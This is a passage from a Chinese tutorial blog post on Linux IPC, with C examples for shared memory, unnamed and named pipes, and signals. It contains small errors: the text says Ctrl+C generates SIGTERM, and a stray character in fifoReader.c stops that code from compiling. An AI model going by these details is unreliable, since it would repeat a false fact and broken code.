class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd = shm_open(BackingFile,      <span class="comment">/* name from smem.h */</span></span><br><span class="line">    O_RDWR | O_CREAT, <span class="comment">/* read/write, create if needed */</span></span><br><span class="line">    AccessPerms);     <span class="comment">/* access permissions (0644) */</span></span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) report_and_exit(<span class="string">"Can't open shared mem segment..."</span>);</span><br><span class="line"></span><br><span class="line">  ftruncate(fd, ByteSize); <span class="comment">/* get the bytes */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">caddr_t</span> memptr = mmap(<span class="literal">NULL</span>,       <span class="comment">/* let system pick where to put segment */</span></span><br><span class="line">ByteSize,   <span class="comment">/* how many bytes */</span></span><br><span class="line">PROT_READ | PROT_WRITE, <span class="comment">/* access protections */</span></span><br><span class="line">MAP_SHARED, <span class="comment">/* mapping visible to other processes */</span></span><br><span class="line">fd,         <span class="comment">/* file descriptor */</span></span><br><span class="line"><span class="number">0</span>);         <span class="comment">/* offset: start at 1st byte */</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">caddr_t</span>) <span class="number">-1</span>  == memptr) report_and_exit(<span class="string">"Can't get segment..."</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"shared mem address: %p [0..%d]\n"</span>, memptr, ByteSize - <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"backing file:       /dev/shm%s\n"</span>, BackingFile );</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* semahore code to lock the shared mem */</span></span><br><span class="line">  <span class="keyword">sem_t</span>* semptr = sem_open(SemaphoreName, <span class="comment">/* name */</span></span><br><span class="line">   O_CREAT,       <span class="comment">/* create the semaphore */</span></span><br><span class="line">   AccessPerms,   <span class="comment">/* protection perms */</span></span><br><span class="line">   <span class="number">0</span>);            <span class="comment">/* initial value */</span></span><br><span class="line">  <span class="keyword">if</span> (semptr == (<span class="keyword">void</span>*) <span class="number">-1</span>) report_and_exit(<span class="string">"sem_open"</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">strcpy</span>(memptr, MemContents); <span class="comment">/* copy some ASCII bytes to the segment */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* increment the semaphore so that memreader can read */</span></span><br><span class="line">  <span class="keyword">if</span> (sem_post(semptr) &lt; <span class="number">0</span>) report_and_exit(<span class="string">"sem_post"</span>);</span><br><span class="line"></span><br><span class="line">  sleep(<span class="number">12</span>); <span class="comment">/* give reader a chance */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* clean up */</span></span><br><span class="line">  munmap(memptr, ByteSize); <span class="comment">/* unmap the storage */</span></span><br><span class="line">  <span class="built_in">close</span>(fd);</span><br><span class="line">  sem_close(semptr);</span><br><span class="line">  shm_unlink(BackingFile); <span class="comment">/* unlink from the backing file */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>memreader.c</code>程序分析：调用<code>shm_open</code>使用<code>memwrite</code>中的文件描述符从共享内存段中获取一个指针。接着是对<code>mmap</code>的调用，第一个参数为<code>NULL</code>，这意味着让系统自己决定在虚拟内存地址的哪个地方分配内存；<code>MAP_SHARED</code>标志着被分配的内存在进程中是共享的。另外的保护参数<code>AccessPerms</code>暗示着共享内存是可读可写的。然后调用<code>sem_open</code>函数时，通过信号量的名字来获取信号量。但<code>memreader</code>随后将进入等待状态，直到<code>memwriter</code>将初始值为 0 的信号量的值增加。一旦等待结束，<code>memreader</code>将从共享内存中读取<code>ASCII</code>数据，然后做些清理工作并终止。 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;          </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"shmem.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">report_and_exit</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd = shm_open(BackingFile, O_RDWR, AccessPerms);  <span class="comment">/*empty to begin*/</span></span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) report_and_exit(<span class="string">"Can't get file descriptor..."</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* get a pointer to memory */</span></span><br><span class="line">  <span class="keyword">caddr_t</span> memptr = mmap(<span class="literal">NULL</span>, <span class="comment">/* let system pick where to put segment */</span></span><br><span class="line">ByteSize,   <span class="comment">/* how many bytes */</span></span><br><span class="line">PROT_READ | PROT_WRITE, <span class="comment">/* access protections */</span></span><br><span class="line">MAP_SHARED, <span class="comment">/* mapping visible to other processes */</span></span><br><span class="line">fd,         <span class="comment">/* file descriptor */</span></span><br><span class="line"><span class="number">0</span>);         <span class="comment">/* offset: start at 1st byte */</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">caddr_t</span>) <span class="number">-1</span> == memptr) report_and_exit(<span class="string">"Can't access segment..."</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* create a semaphore for mutual exclusion */</span></span><br><span class="line">  <span class="keyword">sem_t</span>* semptr = sem_open(SemaphoreName, <span class="comment">/* name */</span></span><br><span class="line">   O_CREAT,       <span class="comment">/* create the semaphore */</span></span><br><span class="line">   AccessPerms,   <span class="comment">/* protection perms */</span></span><br><span class="line">   <span class="number">0</span>);            <span class="comment">/* initial value */</span></span><br><span class="line">  <span class="keyword">if</span> (semptr == (<span class="keyword">void</span>*) <span class="number">-1</span>) report_and_exit(<span class="string">"sem_open"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* use semaphore as a mutex (lock) by waiting for writer to increment it */</span></span><br><span class="line">  <span class="keyword">if</span> (!sem_wait(semptr)) &#123; <span class="comment">/* wait until semaphore != 0 */</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(MemContents); i++)</span><br><span class="line">      <span class="built_in">write</span>(STDOUT_FILENO, memptr + i, <span class="number">1</span>); <span class="comment">/* one byte at a time */</span></span><br><span class="line">    sem_post(semptr);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* cleanup */</span></span><br><span class="line">  munmap(memptr, ByteSize);</span><br><span class="line">  <span class="built_in">close</span>(fd);</span><br><span class="line">  sem_close(semptr);</span><br><span class="line">  unlink(BackingFile);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="管道通信-fifoWriter-fifoReader"><a href="#管道通信-fifoWriter-fifoReader" class="headerlink" title="管道通信 ./fifoWriter ./fifoReader"></a>管道通信 <code>./fifoWriter ./fifoReader</code></h2><ol><li><p>管道通信发送进程以字符流形式将大量数据送入管道，接收进程可从管道接收数据，二者利用管道进行通信。 </p></li><li><p>无名管道<code>pipeUN.c</code>程序分析：首先使用<code>forrk</code>创建一个进程，虽然它只有单一的源文件，在它正确执行的情况下将会发生多进程的情况。如果成功地产生一个子进程，<code>pipeFDs[2]</code>来保存两个文件描述符，一个用来向管道中写入，另一个从管道中写入。(数组元素<code>pipeFDs[0]</code>是读端的文件描述符，元素<code>pipeFDs[1]</code>是写端的文件描述符)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt; /* wait */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;   /* exit functions */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;   /* read, write, pipe, _exit */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ReadEnd  0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WriteEnd 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">report_and_exit</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);    <span class="comment">/** failure **/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> pipeFDs[<span class="number">2</span>]; <span class="comment">/* two file descriptors */</span></span><br><span class="line">  <span class="keyword">char</span> buf;       <span class="comment">/* 1-byte buffer */</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* msg = <span class="string">"Nature's first green is gold\n"</span>; <span class="comment">/* bytes to write */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pipe(pipeFDs) &lt; <span class="number">0</span>) report_and_exit(<span class="string">"pipeFD"</span>);</span><br><span class="line">  <span class="keyword">pid_t</span> cpid = fork();<span class="comment">/* fork a child process */</span></span><br><span class="line">  <span class="keyword">if</span> (cpid &lt; <span class="number">0</span>) report_and_exit(<span class="string">"fork"</span>);  <span class="comment">/* check for failure */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> == cpid) &#123;    <span class="comment">/*** child ***/</span>     <span class="comment">/* child process */</span></span><br><span class="line">    <span class="built_in">close</span>(pipeFDs[WriteEnd]);<span class="comment">/* child reads, doesn't write */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">read</span>(pipeFDs[ReadEnd], &amp;buf, <span class="number">1</span>) &gt; <span class="number">0</span>)<span class="comment">/* read until end of byte stream */</span></span><br><span class="line">      <span class="built_in">write</span>(STDOUT_FILENO, &amp;buf, <span class="keyword">sizeof</span>(buf)); <span class="comment">/* echo to the standard output */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(pipeFDs[ReadEnd]);<span class="comment">/* close the ReadEnd: all done */</span></span><br><span class="line">    _exit(<span class="number">0</span>);<span class="comment">/* exit and notify parent at once  */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;              <span class="comment">/*** parent ***/</span></span><br><span class="line">    <span class="built_in">close</span>(pipeFDs[ReadEnd]);<span class="comment">/* parent writes, doesn't read */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">write</span>(pipeFDs[WriteEnd], msg, <span class="built_in">strlen</span>(msg));<span class="comment">/* write the bytes to the pipe */</span></span><br><span class="line">    <span class="built_in">close</span>(pipeFDs[WriteEnd]);</span><br></pre></td></tr></table></figure></li><li><p>命令管道：无名管道没有备份文件，系统将维持一个内存缓存来将字节数据从写方传给读方。一旦写方和读方终止，这个缓存将会被回收，进而无名管道消失。相反的，命名管道有备份文件和一个不同的<code>API</code>。</p></li><li><p><code>fifoWriter.c</code>程序分析：首先创建一个命名管道来写入数据，然后调用<code>open</code>函数，返回以一个文件描述符。<code>fifoWriter</code>不会一次性将所有的数据都写入，而是写入一个块，然后休息随机数目的微秒时间，接着再循环往复。关闭命名管道后，<code>fifoWriter</code>也将使用<code>unlink</code>取消对该文件的连接。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MaxLoops         12000   <span class="comment">/* outer loop */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ChunkSize           16   <span class="comment">/* how many written at a time */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IntsPerChunk         4   <span class="comment">/* four 4-byte ints per chunk */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MaxZs              250   <span class="comment">/* max microseconds to sleep */</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* pipeName = <span class="string">"./fifoChannel"</span>;</span><br><span class="line">  mkfifo(pipeName, <span class="number">0666</span>);                      <span class="comment">/* read/write for user/group/others */</span></span><br><span class="line">  <span class="keyword">int</span> fd = <span class="built_in">open</span>(pipeName, O_CREAT | O_WRONLY); <span class="comment">/* open as write-only */</span></span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;                       <span class="comment">/** error **/</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MaxLoops; i++) &#123;    <span class="comment">/* write MaxWrites times */</span></span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; ChunkSize; j++) &#123; <span class="comment">/*each time, write ChunkSize bytes*/</span></span><br><span class="line">      <span class="keyword">int</span> k;</span><br><span class="line">      <span class="keyword">int</span> chunk[IntsPerChunk];</span><br><span class="line">      <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; IntsPerChunk; k++) </span><br><span class="line">chunk[k] = rand();             </span><br><span class="line">      <span class="built_in">write</span>(fd, chunk, <span class="keyword">sizeof</span>(chunk)); </span><br><span class="line">    &#125;</span><br><span class="line">    usleep((rand() % MaxZs) + <span class="number">1</span>);      <span class="comment">/* pause a bit for realism */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">close</span>(fd);                           <span class="comment">/* close pipe: generates an end-of-file */</span></span><br><span class="line">  unlink(pipeName);    <span class="comment">/* unlink from the implementing file */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%i ints sent to the pipe.\n"</span>, MaxLoops * ChunkSize * IntsPerChunk);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>fifoReader.c</code>程序分析：因为<code>fifoWriter</code>已经创建了命名管道，所以<code>fifiReader</code>只需要调用<code>open</code>来通过备份文件来获取管道中的内容。接着程序进入一个潜在的无限循环，在每次循环时，尝试读取 4 字节的块在读入 4 字节整数后，<code>fifoReader</code> 检查这个数是否为质数。这个操作代表了一个生产级别的读取器可能在接收到的字节数据上执行的逻辑操作。在示例运行中，在接收到的768000个整数中有 37682 个质数。read 返回 0 来暗示该流的结束。在这种情况下，<code>fifoReader</code>跳出循环，关闭命名管道，并在终止前<code>unlink</code>备份文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">is_prime</span><span class="params">(<span class="keyword">unsigned</span> n)</span> </span>&#123; <span class="comment">/* not pretty, but gets the job done efficiently */</span></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">3</span>) <span class="keyword">return</span> n &gt; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> == (n % <span class="number">2</span>) || <span class="number">0</span> == (n % <span class="number">3</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">5</span>; (i * i) &lt;= n; i += <span class="number">6</span>) </span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == (n % i) || <span class="number">0</span> == (n % (i + <span class="number">2</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">/* found a prime! */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* file = <span class="string">"./fifoChannel"</span>;</span><br><span class="line">  <span class="keyword">int</span> fd = <span class="built_in">open</span>(file, O_RDONLY); </span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">/* no point in continuing */</span></span><br><span class="line">  <span class="keyword">unsigned</span> count = <span class="number">0</span>, total = <span class="number">0</span>, primes_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">ssize_t</span> count = <span class="built_in">read</span>(fd, &amp;next, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == count) <span class="keyword">break</span>;                  <span class="comment">/* end of stream */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (count == <span class="keyword">sizeof</span>(<span class="keyword">int</span>)) &#123;        <span class="comment">/* read a 4-byte int value */</span></span><br><span class="line">      total++;c</span><br><span class="line">      <span class="keyword">if</span> (is_prime(next)) primes_count++;</span><br><span class="line">    &#125;   </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">close</span>(fd);       <span class="comment">/* close pipe from read end */</span></span><br><span class="line">  unlink(file);    <span class="comment">/* unlink from the underlying file */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Received ints: %u, primes: %u\n"</span>, total, primes_count);  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="信号量互斥-shutdown"><a href="#信号量互斥-shutdown" class="headerlink" title="信号量互斥 ./shutdown"></a>信号量互斥 <code>./shutdown</code></h2><ol><li><p>信号会中断一个正在执行的程序，在这种意义下，就是用信号与这个程序进行通信。大多数的信号要么可以被忽略(阻塞)或者被处理(通过特别设计的代码)。<code>SIGSTOP</code> (暂停)和<code>SIGKILL</code>(立即停止)是最应该提及的两种信号。这种符号常量有整数类型的值，例如<code>SIGKILL</code>对应的值为 9。信号可以在与用户交互的情况下发生。例如，一个用户从命令行中敲了<code>Ctrl+C</code>来终止一个从命令行中启动的程序；<code>Ctrl+C</code>将产生一个<code>SIGTERM</code>信号。<code>SIGTERM</code>即终止，它可以被阻塞或者被处理，而不像<code>SIGKILL</code>信号那样。一个进程也可以通过信号和另一个进程通信，这样使得信号也可以作为一种<code>IPC</code>机制。</p></li><li><p><code>shutdown.c</code>程序分析：该程序由一个父进程和一个子进程组成。首先父进程尝试去<code>fork</code>一个子进程，如果<code>fork</code>成功，每个进程去执行自己的代码，即子进程执行<code>child_code</code>，父进程执行<code>parent_code</code>。子进程将会进入一个潜在的无线循环，在该循环中子进程将睡眠一秒，然后打印一个信息。来自父进程的一个<code>SIGTERM</code>信号将引起子进程去执行一个信号处理回调函数 <code>graceful</code>。这样这个信号就使子进程跳出循环，然后进行子进程和父进程的终止，并打印消息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">graceful</span><span class="params">(<span class="keyword">int</span> signum)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\tChild confirming received signal: %i\n"</span>, signum);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\tChild about to terminate gracefully..."</span>);</span><br><span class="line"></span><br><span class="line">  sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\tChild terminating now..."</span>);</span><br><span class="line">  _exit(<span class="number">0</span>); <span class="comment">/* fast-track notification of parent */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_handler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">current</span>;</span></span><br><span class="line">  sigemptyset(&amp;current.sa_mask);         <span class="comment">/* clear the signal set */</span></span><br><span class="line">  current.sa_flags = <span class="number">0</span>;<span class="comment">/* enables setting sa_handler, not sa_action */</span></span><br><span class="line">  current.sa_handler = graceful;         <span class="comment">/* specify a handler */</span></span><br><span class="line">  sigaction(SIGTERM, &amp;current, <span class="literal">NULL</span>);    <span class="comment">/* register the handler */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">child_code</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  set_handler();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;   <span class="comment">/** loop until interrupted **/</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\tChild just woke up, but going back to 